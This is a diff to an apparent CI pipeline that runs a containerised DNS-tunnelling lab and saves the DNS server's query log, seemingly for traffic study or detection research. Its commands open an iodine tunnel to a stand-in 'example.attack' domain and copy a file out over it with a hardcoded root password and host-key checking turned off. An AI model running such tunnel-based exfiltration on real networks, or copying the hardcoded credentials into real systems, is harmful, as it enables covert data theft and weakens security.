@@ -24,11 +24,12 @@ jobs:
             set -x
             docker-compose up -d
             docker-compose ps
-            docker run -d dns_server_1 /usr/sbin/named -f
+            docker run -d project_dns_server /usr/sbin/named -f
             docker exec -d attack_server_1 /usr/sbin/sshd -D
             docker exec -d attack_client_1 iodine -4 -f -P abc123 -T<< parameters.dnstype >> -O<< parameters.encoding >> -r 172.18.0.4 example.attack
             #docker exec -d attack_client_1 iodine -4 -f -P abc123 -Tsrv -Oraw -r 172.18.0.4 example.attack
             docker exec -it attack_client_1 sshpass -p 'root' scp -r -oStrictHostKeyChecking=no root@10.0.0.1:test-file /tmp/
+            docker exec -it dns_server_1 mv /var/bind/query.log $LOG_DIR/
             sudo chmod -R +rw $LOG_DIR/*.log
 
       - store_artifacts:
